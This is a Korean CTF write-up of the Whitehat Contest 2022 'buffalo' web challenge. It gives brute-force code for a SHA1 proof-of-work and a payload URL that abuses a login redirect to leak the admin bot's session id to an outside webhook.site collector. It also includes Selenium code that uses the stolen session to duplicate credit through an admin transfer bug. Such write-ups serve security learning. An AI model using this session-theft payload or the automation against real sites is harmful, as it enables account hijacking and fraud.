---
title: "Whitehat Contest 2022 Write up"
date: 2022-10-24 +0900
img_path: /assets/img/posts/whitehat_contest_2022_writeup
categories: [WRITE-UP]
tags: ["화이트햇 콘테스트", "whitehat contest", "2022"]
---
# Challenges

- WEB - buffalo[STEAL] `269point`

---
## buffalo[STEAL] `269point`

`mypage.php`에서 flag를 출력해주는 것을 알 수 있는데 그 조건은 `$level`값이  `VVIP`가 되야한다. 즉, credit이라는 값이 1e8 → 100,000,000 가 되어야 flag를 출력할 수 있다.

```php
<?php 
	if ($user["credit"] > 1e8) {
		  $level = "VVIP";
	}

...

$x = scandir("__flag/");
foreach($x as $uuu) {
	if($uuu[0] == '.') continue;
	    include "__flag/$uuu";
	}

	if ($level == "VVIP") {
	    $excl = "<span class='text-success'>$flag</span>";
	}

...
```

### 1. register.php - 회원가입

#### Pow 값 bruteforcing

- 해당 웹 페이지에서 register를 할려면 pow라는 값을 인증해야 된다.

```php
if(isset($_POST["userid"])) {

    $u = bin2hex($_POST["userid"]); //hexstr is best way to prevent sqli
    $n = bin2hex($_POST["nick"]);
    $c = $_POST["pow"];
    $p = $_POST["pw"];
    $w = $_POST["secret_pw"];

    if (!preg_match("/[0-9A-Za-z]{4,8}/i", $w)) {
        alert_die('Wrong format of second pw', '/register.php');
    }

    if (!check_pow($c)) {
        alert_die('Wrong pow', '/register.php');
    }
```

pow 값을 생성하고 비교하는 부분을 보면 sha1으로 해시한 값에서 앞 5자리만 비교하는 것을 볼 수 있다. 5자리 정도는 bruteforce로 알아낼 수 있을 것 같아서 해시값에 대한 Plain 텍스트를 찾는 코드를 작성했다.

코드를 실행시켜보니 앞 5자리가 pow와 같은 plain 텍스트를 얻을 수 있었다.

```python
from string import ascii_letters, digits
import hashlib

table = ascii_letters + digits

def make_hash(__text):
    return hashlib.sha1(__text.encode()).hexdigest()[:5]

def hash_bf(__pow):
    for char1 in table:
        for char2 in table:
            for char3 in table:
                for char4 in table:
                    for char5 in table:
                        plain = char1 + char2 + char3 + char4 + char5
                        hash = make_hash(plain)
                        if hash == __pow:
                            print("[+] GET TEXT!! : " + plain)
                            return plain

if __name__ == "__main__":
    pow = input("pow > ")
    hash_bf(pow)
```

![Untitled](Untitled.png)

### 2. 로그인 페이지

#### CSRF 취약점

로그인 페이지를 보면 `sessionid`를 보내는 코드가 있다.

조건을 보면 로그인이 상탱서 GET 으로 `next`파라미터를 받으면 `next`에 입력된 페이지로 이동하면서 `sessionid`를 넘겨주는데 이 부분에서 CSRF 취약점이 일어날 수 있다.

```php
if($is_logined && isset($_GET["next"])) {
    header("Location: {$_GET["next"]}?from=login&sess=".session_id());
    die();
}
```

report 페이지는 bot이 동작한다. 사용자가 입력한 url 주소를 파라미터로 받고 있다.

```php
if(substr($url, 0, strlen("http://localhost/")) === "http://localhost/") {
    $param = base64_encode($url);
    $param = escapeshellarg($param);
    exec("node /app/bot.js {$param} > /dev/null &");
    alert_die("Done", "/index.php");    
}
```

`bot.js` 를 보면 report 페이지에서 입력한 url 주소로 request 하는 것을 알 수 있다.

그리고 이를 통해 localhost에서 admin 계정으로 request를 보낸다는 것을 어렴풋이 짐작할 수 있다.

```jsx
(async () => {
  const browser = await puppeteer.launch({
	  headless: false,
	  args: ['--no-sandbox', '--disable-setuid-sandbox'],
  });

  const page = await browser.newPage();
  page.setDefaultNavigationTimeout(5000);

  // Redacted: some small login stuff :D
  await page.goto(url);
  await page.waitForTimeout(1500);
  await browser.close();
})();
```

`login.php`파일에서 일어나는 CSRF 취약점을 이용해 아래와 같은 payload로 report하면 admin의 session id를 얻을 수 있다.

```
http://localhost/login.php?next=https://webhook.site/135b402f-7c9a-47c9-92c4-58ac33d2c8dd
```

CSRF 취약점을 통해 admin의 sessionid를 얻은 것을 볼 수 있다.

![Untitled](Untitled%201.png)

이제 credit 값이 100,000,000이 넘어야된다.

`transfer.php`를 보면 credit을 다른 계정으로 전송하는 기능을 가지고 있는데, 실제로 동작하는 부분인 `api/trasfer.php`를 보면 다음과 같다.

`userid`가 admin인 사용자는 자신에게 credit을 전송할 수 있다. 즉, 돈 복사가 가능하다는 것이다. 그리고 admin의 secondry pw도 알 필요가 없어 transfer 페이지를 이용하여 credit의 값을 올릴 수 있다.

```php
$.post("/api/transfer.php", {
    "amount": amount,
    "recv": recv,
    "token": token,
    "pow": pow,
},
```

```php
if(check_pow($USER_DATA["pow"])) {
    $am = (float)$USER_DATA["amount"];
    $rc = bin2hex($USER_DATA["recv"]);
    $token = sha1($USER_DATA["token"]);

    if($user["userid"] !== "admin") { //admin can copy the money
        if ($am < 5.00) {
            error("Minimum transfer is 5 BFL");
        }

        if ($user["credit"] < $am + 0.05) {
            error("You can't transfer over ".($user["credit"]-0.5)." BFL");
        }

        if ($token !== $user["token"]) {
            error("Wrong secondary pw");
        }
        
        mysqli_query($conn, "update user set credit = credit - ($am + 0.5) where userid = '".bin2hex($user["userid"])."';");
    }
    mysqli_query($conn, "update user set credit = credit + $am where userid = '$rc';");
    success("Transfer succeed");
}
error("Wrong pow");
```

![Untitled](Untitled%202.png)

flag

`FLAG{STEAL-1ts_st1ll_bug_0f_chr0m3_haha}`

추가로 이 문제를 풀 당시에는 transfer 기능을 통해 돈 복사를 할 때 계속 노가다(?)로 해도 생각보다 빨리 1억 BFLs을 만들어줄 수 있었다.

그런데 끝나고 보니 이 부분을 자동화 하지 않은 것이 찝찝하여 자동화 코드를 작성했다.

```python
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from bruteforce import hash_bf
import time

def CreateSession():
    url = "http://127.0.0.1:8000"
    webdriver_options = webdriver.ChromeOptions()
    webdriver_options.add_argument("headless")
    driver = webdriver.Chrome("/usr/bin/chromedriver", options=webdriver_options)
    driver.get(url)
    driver.delete_cookie("PHPSESSID")
    driver.add_cookie({"name":"PHPSESSID", "value":"794806adc1e56b1e12f7eebf4f29324c"})

    return driver

def TransferCash(__driver, __amount):
    url = "http://127.0.0.1:8000/cash/transfer.php"
    __driver.get(url)

    code = __driver.find_elements(By.TAG_NAME, "code")
    pow = code[0].text[-5:]
    solve = hash_bf(pow)

    # 입력 값
    __driver.find_element(By.NAME, "recv_userid").send_keys("admin")
    __driver.find_element(By.NAME, "amount").send_keys(str(__amount))
    __driver.find_element(By.NAME, "secret").send_keys("")
    __driver.find_element(By.NAME, "pow").send_keys(solve)

    # submit
    __driver.find_element_by_xpath('//*[@id="transfer"]').click()

    alert = __driver.switch_to_alert()
    alert.accept()
    time.sleep(1)   # 다음 alert 창을 처리히기 위한 대기
    alert = __driver.switch_to_alert()
    alert.accept()

if __name__ == "__main__":
    browser = CreateSession()

    amount = 50
    while amount < 10 ** 8:
        print("[+] Amount : " + str(amount) + "Bfls")
        TransferCash(browser, amount)
        amount *= 2
```
